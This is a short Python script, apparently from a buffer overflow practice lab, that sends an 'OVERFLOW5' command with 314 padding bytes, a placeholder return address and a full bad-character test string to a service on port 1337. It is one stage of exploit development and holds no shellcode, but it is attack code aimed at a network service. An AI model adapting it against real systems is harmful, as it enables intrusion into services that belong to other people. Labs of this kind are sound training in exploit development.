import socket,sys

ip = sys.argv[1] if sys.argv[1] else "10.10.11.248"
port = 1337

prefix = b"OVERFLOW5 "
offset = 314
overflow = b"A" * offset
retn = b"BBBB"
padding = b""

bad_chars = [0]
payload = b''.join([bytes([i]) for i in range(0,256) if i not in bad_chars])
postfix = b""

buffer = prefix + overflow + retn + padding + payload + postfix
# print(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(buffer + b"\r\n")
  print("Done!")
except Exception as e:
  print(e)
  print("Could not connect.")
